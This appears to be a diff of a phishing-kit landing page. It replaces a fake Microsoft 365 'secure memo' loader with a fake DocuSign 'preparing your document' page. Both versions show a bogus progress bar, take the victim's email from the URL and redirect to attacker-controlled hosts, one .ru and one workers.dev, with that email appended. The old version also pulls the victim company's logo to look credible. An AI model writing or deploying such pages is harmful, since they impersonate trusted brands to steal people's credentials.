@@ -3,269 +3,196 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Accessing Secure Document</title>
+    <title>Accessing Document - DocuSign</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI,system-ui,-apple-system,BlinkMacSystemFont,sans-serif');
-
         body {
-            font-family: 'Segoe UI', sans-serif;
-            background-color: #F8F9FA; /* Light gray background */
+            font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #f8f8f8;
             margin: 0;
-            padding: 20px;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             color: #333;
         }
-
         .container {
-            background-color: #FFFFFF;
-            border: 1px solid #DEE2E6; /* Light border */
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
-            padding: 40px 50px;
-            width: 550px;
-            max-width: 95%;
+            background-color: #ffffff;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            width: 480px;
+            max-width: 90%;
             text-align: center;
         }
-
         .header {
-            margin-bottom: 25px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            margin-bottom: 30px;
         }
-
-        .company-logo {
-            max-width: 150px;
-            max-height: 50px;
-            margin-bottom: 25px;
-            object-fit: contain;
+        .docusign-logo {
+            width: 150px;
+            height: auto;
+            margin-bottom: 20px;
         }
-        
         .title {
-            color: #212529;
-            font-size: 26px;
+            color: #19487C; /* DocuSign's darker blue */
+            font-size: 22px;
             font-weight: 600;
             margin: 0 0 10px 0;
         }
-
         .subtitle {
-            color: #6C757D;
+            color: #555;
             font-size: 16px;
             margin-bottom: 30px;
         }
-
         .loading-container {
+            display: flex;
+            flex-direction: column; 
+            align-items: center;
             margin-bottom: 20px;
         }
-
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0,0,0,0.1);
+            border-top-color: #FFD100; /* DocuSign yellow/gold */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
         .loading-text {
-            color: #005A9E; /* SharePoint blue */
-            font-size: 15px;
+            color: #333;
+            font-size: 16px;
+            font-weight: 500;
             margin: 0;
-            height: 20px;
-            transition: color 0.3s;
         }
-
         .progress-container {
-            background-color: #E9ECEF;
-            height: 4px;
-            border-radius: 2px;
+            background-color: #e0e0e0;
+            height: 8px;
+            border-radius: 4px;
             overflow: hidden;
-            margin: 15px auto 25px;
-            width: 80%;
+            margin-bottom: 20px;
+            width: 100%;
         }
-
-        .progress-bar-fill {
+        .progress-bar-fill { /* Renamed from .progress-bar to match original sec.html */
             height: 100%;
-            background-color: #0078D4; /* Microsoft Blue */
+            background-color: #19487C;
             width: 0%;
-            animation: decrypt-fill 2.5s ease-out forwards;
-            border-radius: 2px;
+            animation: fill 2.5s linear forwards;
+            border-radius: 4px;
         }
-
         .file-info { 
-            color: #6C757D;
+            color: #666;
             font-size: 14px;
             margin: 0 0 30px 0;
         }
-
         .footer-text {
-            color: #ADB5BD;
+            color: #777;
             font-size: 12px;
-            margin-top: 35px;
+            margin-top: 30px;
         }
-
-        @keyframes decrypt-fill {
-            from { width: 0%; }
-            to { width: 100%; }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
-
+        @keyframes fill {
+            0% { width: 0%; }
+            30% { width: 40%; } 
+            70% { width: 80%; }
+            100% { width: 100%; }
+        }
         noscript {
             display: block;
             margin-top: 20px;
             padding: 15px;
-            background-color: #FFF3CD;
+            background-color: #fff3cd;
             color: #856404;
-            border: 1px solid #FFEEBA;
+            border: 1px solid #ffeeba;
             border-radius: 4px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <img src="" alt="Company Logo" class="company-logo" id="companyLogo" style="display: none;">
-            <h1 class="title">Accessing Secure Internal Memo</h1>
-            <p class="subtitle">Please wait while we establish a secure connection to your organization's document.</p>
+            <img src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" alt="DocuSign Logo" class="docusign-logo">
+            <h1 class="title">Preparing Your Document</h1>
+            <p class="subtitle">Please wait a moment while we get things ready for you.</p>
         </div>
         <div class="loading-container">
-            <p class="loading-text" id="loadingText">Establishing secure channel...</p>
+            <div class="spinner"></div>
+            <p class="loading-text">Verifying and loading...</p>
         </div>
         <div class="progress-container">
             <div class="progress-bar-fill" id="progressBar"></div>
         </div>
-        <p class="file-info">This may take a moment.</p>
+        <p class="file-info">This shouldn't take long.</p>
         <noscript>
-            <p>JavaScript is required to access this secure document. Please enable it in your browser settings.</p>
+            <p>JavaScript is essential for DocuSign to function. Please enable JavaScript in your browser settings and reload the page.</p>
         </noscript>
-        <p class="footer-text">Powered by Microsoft 365</p>
+        <p class="footer-text">&copy; DocuSign, Inc. All rights reserved.</p>
     </div>
 
+    <!-- Simple device detection and redirect script -->
     <script>
     (function() {
-        const loadingText = document.getElementById('loadingText');
-        const texts = [
-            "Establishing secure channel...",
-            "Verifying your identity...",
-            "Decrypting document...",
-            "Opening file..."
-        ];
-        let textIndex = 0;
-        const interval = setInterval(() => {
-            textIndex++;
-            if (textIndex < texts.length) {
-                loadingText.textContent = texts[textIndex];
-            } else {
-                clearInterval(interval);
-            }
-        }, 600);
+        const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
+        const MOBILE_REDIRECT_URL_BASE = "https://cx8r7.xegdgnycay.workers.dev/?";
+        const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
+        const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
 
-        const REDIRECT_DELAY = 3500;
-       
-        const MOBILE_REDIRECT_URL_BASE = "https://yvtu.abbqblrszlet.ru/07haTqXmkG@o434P/$";
-
-        function getEmailFromUrl() {
-            // First, try to get base64 encoded email from the first parameter after ?
-            const url = window.location.href;
-            console.log("Current URL:", url);
-            
-            const firstQuestionMark = url.indexOf('?');
-            if (firstQuestionMark !== -1) {
-                const afterQuestion = url.substring(firstQuestionMark + 1);
-                const firstParam = afterQuestion.split('&')[0];
-                console.log("First parameter after ?:", firstParam);
-                
-                // URL decode the parameter first to handle %3D and other encoded characters
-                let decodedParam;
-                try {
-                    decodedParam = decodeURIComponent(firstParam);
-                    console.log("URL decoded parameter:", decodedParam);
-                } catch (e) {
-                    console.log("URL decoding failed, using original:", e.message);
-                    decodedParam = firstParam;
-                }
-                
-                // Try to decode as base64
-                try {
-                    const decodedEmail = atob(decodedParam);
-                    console.log("Decoded from base64:", decodedEmail);
-                    if (decodedEmail && decodedEmail.includes('@') && decodedEmail.includes('.')) {
-                        console.log("Valid email found from base64:", decodedEmail);
-                        return decodedEmail;
-                    }
-                } catch (e) {
-                    console.log("Base64 decoding failed:", e.message);
-                }
-                
-                // If URL decoded param didn't work, also try the original param
-                if (decodedParam !== firstParam) {
-                    try {
-                        const decodedEmail = atob(firstParam);
-                        console.log("Decoded from base64 (original):", decodedEmail);
-                        if (decodedEmail && decodedEmail.includes('@') && decodedEmail.includes('.')) {
-                            console.log("Valid email found from base64 (original):", decodedEmail);
-                            return decodedEmail;
-                        }
-                    } catch (e) {
-                        console.log("Base64 decoding failed (original):", e.message);
-                    }
-                }
-            }
-
-            // Fallback to existing functionality - get email from state parameter
-            console.log("Checking state parameter for email...");
-            const searchParams = new URLSearchParams(window.location.search);
-            const state = searchParams.get('state');
-            console.log("State parameter:", state);
-            
-            if (!state) {
-                console.log("No state parameter found");
-                return null;
-            }
-
-            const parts = state.split(':');
-            if (parts.length > 1) {
-                const potentialEmail = parts[parts.length - 1];
-                console.log("Potential email from state:", potentialEmail);
-                if (potentialEmail && potentialEmail.includes('@')) {
-                    console.log("Valid email found from state:", potentialEmail);
-                    return potentialEmail;
-                }
-            }
-            console.log("No valid email found");
-            return null;
+        // Mobile device detection function
+        function isMobileDevice() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
         }
 
-        function setCompanyLogo(email) {
-            if (!email) return;
-            const domain = email.split('@')[1];
-            if (domain) {
-                const logoEl = document.getElementById('companyLogo');
-                const logoUrl = `https://logo.clearbit.com/${domain}`;
-                
-                logoEl.src = logoUrl;
-                logoEl.onload = () => { logoEl.style.display = 'block'; };
-                logoEl.onerror = () => { logoEl.style.display = 'none'; };
-            }
-        }
-        
+        // Get potential value from hash (priority) or search string
+     function getPotentialValue() {
+    // Combine hash and search into a single query-like string
+    const queryString = window.location.hash.substring(1) + '&' + window.location.search.substring(1);
+
+    // Parse parameters
+    const params = new URLSearchParams(queryString);
+
+    // Get the 'state' value
+    const stateValue = params.get('state');
+    if (!stateValue) return null;
+
+    // Extract email after the colon
+    const parts = stateValue.split(':');
+    return parts.length > 1 ? decodeURIComponent(parts[1]) : decodeURIComponent(stateValue);
+}
+
+
+        // Main redirect function
         function performRedirect() {
-            clearInterval(interval);
-            const email = getEmailFromUrl();
+            const value = getPotentialValue();
 
-            if (email) {
-                console.log("Found email:", email);
-                const redirectUrl = MOBILE_REDIRECT_URL_BASE + encodeURIComponent(email);
-                console.log("Redirecting to:", redirectUrl);
-                window.location.href = redirectUrl;
-            } else {
-                console.log("No email found in state parameter. Showing error.");
-                document.getElementById('loadingText').textContent = 'Access Denied: Invalid or Expired Link';
-                document.getElementById('loadingText').style.color = '#DC3545'; // Red error color
-                document.querySelector('.file-info').textContent = 'Please check the link or contact the sender.';
-                const progressBar = document.getElementById('progressBar');
-                if (progressBar) {
-                    progressBar.style.background = '#DC3545';
-                    progressBar.style.width = '100%';
+            if (value) {
+                console.log("Found value:", value);
+                if (isMobileDevice()) {
+                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                    window.location.href = redirectUrl;
+                } else {
+                     const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                    window.location.href = redirectUrl;
                 }
+            } else {
+                console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
+                document.querySelector('.loading-text').textContent = 'Error: Link invalid or expired.';
+                document.querySelector('.file-info').textContent = 'Please check the link or contact support.';
+                if(document.getElementById('progressBar')) {
+                    document.getElementById('progressBar').style.backgroundColor = '#d9534f'; // Error color
+                    document.getElementById('progressBar').style.width = '100%';
+                }
+                // No redirect if no value, error is shown on page
             }
         }
-        
-        const email = getEmailFromUrl();
-        setCompanyLogo(email);
+
+        // Execute redirect after a short delay
         setTimeout(performRedirect, REDIRECT_DELAY);
     })();
     </script>
